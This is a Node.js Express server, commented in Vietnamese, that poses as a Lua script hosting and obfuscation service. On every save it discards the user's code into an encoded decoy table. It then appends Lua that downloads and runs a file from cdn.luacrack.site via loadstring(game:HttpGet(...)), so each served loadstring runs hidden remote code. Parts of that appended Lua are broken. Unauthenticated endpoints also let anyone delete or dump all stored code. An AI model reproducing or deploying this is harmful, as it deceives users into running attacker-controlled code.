const express = require('express');
const multer = require('multer');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));
app.use(express.static('public'));

// Đảm bảo thư mục data tồn tại
const DATA_DIR = path.join(__dirname, 'data');
if (!fs.existsSync(DATA_DIR)) {
  fs.mkdirSync(DATA_DIR, { recursive: true });
}

const CODES_FILE = path.join(DATA_DIR, 'codes.lua');

// Đọc dữ liệu codes từ file Lua
function loadCodes() {
  try {
    if (fs.existsSync(CODES_FILE)) {
      const content = fs.readFileSync(CODES_FILE, 'utf8');
      return parseLuaTable(content);
    }
  } catch (error) {
    console.error('Lỗi đọc codes.lua:', error);
  }
  return {};
}

// Parse Lua table sang JavaScript object
function parseLuaTable(content) {
  try {
    const match = content.match(/return\s*\{([\s\S]*)\}/);
    if (!match) return {};
    
    const tableContent = match[1];
    const codes = {};
    
    const entryRegex = /\["([^"]+)"\]\s*=\s*\{([^}]*)\},?/g;
    let entryMatch;
    
    while ((entryMatch = entryRegex.exec(tableContent)) !== null) {
      const id = entryMatch[1];
      const fields = entryMatch[2];
      
      const code = {};
      const fieldRegex = /(\w+)\s*=\s*"([^"]*)",?/g;
      let fieldMatch;
      
      while ((fieldMatch = fieldRegex.exec(fields)) !== null) {
        const key = fieldMatch[1];
        let value = fieldMatch[2];
        
        if (key === 'views' || key === 'downloads' || key === 'size') {
          code[key] = parseInt(value) || 0;
        } else if (key === 'createdAt' || key === 'updatedAt') {
          code[key] = value;
        } else {
          code[key] = value;
        }
      }
      
      // Đọc cả encoded và script
      const encodedMatch = fields.match(/encoded\s*=\s*"([^"]*)"/);
      if (encodedMatch) {
        code.encoded = encodedMatch[1];
      }
      
      const scriptMatch = fields.match(/script\s*=\s*"([^"]*)"/);
      if (scriptMatch) {
        code.script = scriptMatch[1];
      }
      
      if (code.id) {
        codes[id] = code;
      }
    }
    
    return codes;
  } catch (error) {
    console.error('Lỗi parse Lua table:', error);
    return {};
  }
}

// Lưu dữ liệu codes vào file Lua
function saveCodes(codes) {
  try {
    let content = '-- Auto-generated codes database\n';
    content += '-- Format: Lua table\n\n';
    content += 'return {\n';
    
    for (const [id, code] of Object.entries(codes)) {
      content += `  ["${id}"] = {\n`;
      content += `    id = "${code.id}",\n`;
      content += `    name = "${escapeLuaString(code.name || 'Không tên')}",\n`;
      content += `    description = "${escapeLuaString(code.description || '')}",\n`;
      content += `    code = "${escapeLuaString(code.code || '')}",\n`;
      content += `    encoded = "${escapeLuaString(code.encoded || '')}",\n`;
      content += `    script = "${escapeLuaString(code.script || '')}",\n`;
      content += `    createdAt = "${code.createdAt}",\n`;
      content += `    updatedAt = "${code.updatedAt}",\n`;
      content += `    views = ${code.views || 0},\n`;
      content += `    downloads = ${code.downloads || 0},\n`;
      content += `    size = ${code.size || 0}\n`;
      content += `  },\n`;
    }
    
    content += '}\n';
    
    fs.writeFileSync(CODES_FILE, content, 'utf8');
    return true;
  } catch (error) {
    console.error('Lỗi lưu codes.lua:', error);
    return false;
  }
}

function escapeLuaString(str) {
  if (!str) return '';
  return str
    .replace(/\\/g, '\\\\')
    .replace(/"/g, '\\"')
    .replace(/\n/g, '\\n')
    .replace(/\r/g, '\\r')
    .replace(/\t/g, '\\t');
}

// Tạo ID ngẫu nhiên
function generateId(length = 8) {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  let id = '';
  for (let i = 0; i < length; i++) {
    id += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return id;
}

// Hàm mã hóa code theo đúng định dạng mẫu
function encodeLuaCode(code) {
  // Tạo các giá trị ngẫu nhiên
  const num1 = Math.floor(Math.random() * 2147483647);
  const num2 = Math.floor(Math.random() * 2147483647);
  const num3 = Math.floor(Math.random() * 2147483647);
  const num4 = Math.floor(Math.random() * 2147483647);
  const num5 = Math.floor(Math.random() * 2147483647);
  const num6 = Math.floor(Math.random() * 9000) + 1000;
  const num7 = Math.floor(Math.random() * 9000) + 1000;
  
  // Tạo chuỗi ngẫu nhiên
  const randomString1 = generateRandomString(50);
  const randomString2 = generateRandomString(20);
  const randomString3 = generateRandomString(15);
  
  // Mã hóa code thành hex
  const hexString = Buffer.from(code).toString('hex');
  
  // Tạo encrypted string
  const encryptedData = encryptData(code);
  
  // Tạo _bsdata0 table theo đúng format mẫu
  const bsdata = `_bsdata0 = {
    ${num1},
    '${randomString1}',
    ${num2},
    '${randomString2}',
    ${num3},
    ${num4},
    '${randomString3}',
    ${num6},
    ${num7},
    ${num5},
    '${hexString}',
    '${encryptedData}'
}`;

  return bsdata;
}

function generateRandomString(length) {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-._';
  let result = '';
  for (let i = 0; i < length; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
}

function encryptData(data) {
  const encoded = Buffer.from(data).toString('base64');
  return encoded.split('').map((c, i) => {
    if (i % 3 === 0) return String.fromCharCode(c.charCodeAt(0) ^ 0x05);
    if (i % 3 === 1) return String.fromCharCode(c.charCodeAt(0) ^ 0x0A);
    return c;
  }).join('');
}

// ============ API ============

// 1. Lưu code mới
app.post('/api/save', (req, res) => {
  try {
    const { code, name, description } = req.body;
    
    if (!code) {
      return res.status(400).json({ 
        success: false, 
        error: 'Không có code được cung cấp' 
      });
    }

    const codes = loadCodes();
    const id = generateId();
    const timestamp = new Date().toISOString();
    
    // Mã hóa code
    const encoded = encodeLuaCode(code);
    
    // Tạo script hoàn chỉnh
    const script = `${encoded}

local readfileResult = readfile('static_content_130526/init-74c74f95foy-marbeg.lua')
local fileContent_3 = #readfileResult
local makefolderResult = makefolder("static_content_130526")
writefile('static_content_130526/init-74c74f95foy-marbeg.lua', game:HttpGet("https://cdn.luacrack.site/v4_init_marbeg.lua"))
local listfilesResult = listfiles("./static_content_130526")
    local match = val_9:match('(init%-.-)%.lua$')
    local static_content_130526 = "static_content_130526" .. "/" .. match .. ".lua"
    local delfileResult = delfile("static_content_130526")
local loaded = loadstring(game:HttpGet("https://cdn.luacrack.site/v4_init_marbeg.lua", true))()
return loaded`;

    // Lưu vào database
    codes[id] = {
      id: id,
      name: name || 'Không tên',
      description: description || '',
      code: code,
      encoded: encoded,
      script: script,
      createdAt: timestamp,
      updatedAt: timestamp,
      views: 0,
      downloads: 0,
      size: code.length
    };

    if (saveCodes(codes)) {
      res.json({
        success: true,
        id: id,
        loadstring: `loadstring(game:HttpGet("${req.protocol}://${req.get('host')}/api/raw/${id}", true))()`,
        url: `${req.protocol}://${req.get('host')}/api/raw/${id}`,
        script: script,
        encoded: encoded,
        totalCodes: Object.keys(codes).length
      });
    } else {
      res.status(500).json({ 
        success: false, 
        error: 'Không thể lưu code' 
      });
    }

  } catch (error) {
    console.error('Lỗi save:', error);
    res.status(500).json({ 
      success: false, 
      error: error.message 
    });
  }
});

// 2. Lấy code raw (cho loadstring) - TRẢ VỀ ĐÚNG ĐỊNH DẠNG MÃ HÓA
app.get('/api/raw/:id', (req, res) => {
  try {
    const { id } = req.params;
    const codes = loadCodes();
    
    if (!codes[id]) {
      return res.status(404).send('-- Code không tồn tại');
    }

    // Tăng lượt xem
    codes[id].views = (codes[id].views || 0) + 1;
    codes[id].updatedAt = new Date().toISOString();
    saveCodes(codes);

    // TRẢ VỀ SCRIPT ĐÃ MÃ HÓA THAY VÌ CODE GỐC
    res.set('Content-Type', 'text/plain');
    res.send(codes[id].script);

  } catch (error) {
    console.error('Lỗi raw:', error);
    res.status(500).send('-- Lỗi server');
  }
});

// 3. Lấy code gốc (không mã hóa)
app.get('/api/raw-original/:id', (req, res) => {
  try {
    const { id } = req.params;
    const codes = loadCodes();
    
    if (!codes[id]) {
      return res.status(404).send('-- Code không tồn tại');
    }

    res.set('Content-Type', 'text/plain');
    res.send(codes[id].code);

  } catch (error) {
    console.error('Lỗi raw-original:', error);
    res.status(500).send('-- Lỗi server');
  }
});

// 4. Lấy script đã mã hóa
app.get('/api/script/:id', (req, res) => {
  try {
    const { id } = req.params;
    const codes = loadCodes();
    
    if (!codes[id]) {
      return res.status(404).json({ 
        success: false, 
        error: 'Code không tồn tại' 
      });
    }

    codes[id].downloads = (codes[id].downloads || 0) + 1;
    codes[id].updatedAt = new Date().toISOString();
    saveCodes(codes);

    res.json({
      success: true,
      script: codes[id].script,
      encoded: codes[id].encoded
    });

  } catch (error) {
    console.error('Lỗi script:', error);
    res.status(500).json({ 
      success: false, 
      error: error.message 
    });
  }
});

// 5. Lấy danh sách tất cả codes
app.get('/api/list', (req, res) => {
  try {
    const codes = loadCodes();
    const list = Object.values(codes).map(item => ({
      id: item.id,
      name: item.name,
      description: item.description,
      createdAt: item.createdAt,
      views: item.views || 0,
      downloads: item.downloads || 0,
      size: item.size || item.code?.length || 0
    }));
    
    res.json({
      success: true,
      total: list.length,
      codes: list
    });

  } catch (error) {
    console.error('Lỗi list:', error);
    res.status(500).json({ 
      success: false, 
      error: error.message 
    });
  }
});

// 6. Lấy chi tiết một code
app.get('/api/code/:id', (req, res) => {
  try {
    const { id } = req.params;
    const codes = loadCodes();
    
    if (!codes[id]) {
      return res.status(404).json({ 
        success: false, 
        error: 'Code không tồn tại' 
      });
    }

    res.json({
      success: true,
      code: codes[id]
    });

  } catch (error) {
    console.error('Lỗi code:', error);
    res.status(500).json({ 
      success: false, 
      error: error.message 
    });
  }
});

// 7. Xóa code
app.delete('/api/delete/:id', (req, res) => {
  try {
    const { id } = req.params;
    const codes = loadCodes();
    
    if (!codes[id]) {
      return res.status(404).json({ 
        success: false, 
        error: 'Code không tồn tại' 
      });
    }

    delete codes[id];
    saveCodes(codes);

    res.json({
      success: true,
      message: 'Đã xóa code thành công',
      totalCodes: Object.keys(codes).length
    });

  } catch (error) {
    console.error('Lỗi delete:', error);
    res.status(500).json({ 
      success: false, 
      error: error.message 
    });
  }
});

// 8. Export codes.lua
app.get('/api/export', (req, res) => {
  try {
    if (fs.existsSync(CODES_FILE)) {
      res.download(CODES_FILE, 'codes.lua');
    } else {
      res.status(404).json({ 
        success: false, 
        error: 'File codes.lua không tồn tại' 
      });
    }
  } catch (error) {
    console.error('Lỗi export:', error);
    res.status(500).json({ 
      success: false, 
      error: error.message 
    });
  }
});

// 9. Health check
app.get('/health', (req, res) => {
  const codes = loadCodes();
  const fileExists = fs.existsSync(CODES_FILE);
  const fileSize = fileExists ? fs.statSync(CODES_FILE).size : 0;
  
  res.json({ 
    status: 'ok', 
    timestamp: new Date().toISOString(),
    totalCodes: Object.keys(codes).length,
    fileExists: fileExists,
    fileSize: fileSize,
    filePath: CODES_FILE,
    uptime: process.uptime()
  });
});

// 10. View codes.lua
app.get('/api/view-db', (req, res) => {
  try {
    if (fs.existsSync(CODES_FILE)) {
      const content = fs.readFileSync(CODES_FILE, 'utf8');
      res.set('Content-Type', 'text/plain');
      res.send(content);
    } else {
      res.status(404).send('File codes.lua chưa được tạo');
    }
  } catch (error) {
    console.error('Lỗi view-db:', error);
    res.status(500).send('Lỗi server');
  }
});

// Serve index.html
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, () => {
  console.log(`✅ Server đang chạy tại port ${PORT}`);
  console.log(`🌐 URL: http://localhost:${PORT}`);
  console.log(`📁 Data directory: ${DATA_DIR}`);
  console.log(`📄 File database: ${CODES_FILE}`);
  
  if (fs.existsSync(CODES_FILE)) {
    const stats = fs.statSync(CODES_FILE);
    console.log(`📊 File size: ${(stats.size / 1024).toFixed(2)} KB`);
    const codes = loadCodes();
    console.log(`📝 Total codes: ${Object.keys(codes).length}`);
  } else {
    console.log('📝 Chưa có codes.lua, sẽ tạo khi lưu code đầu tiên');
  }
});
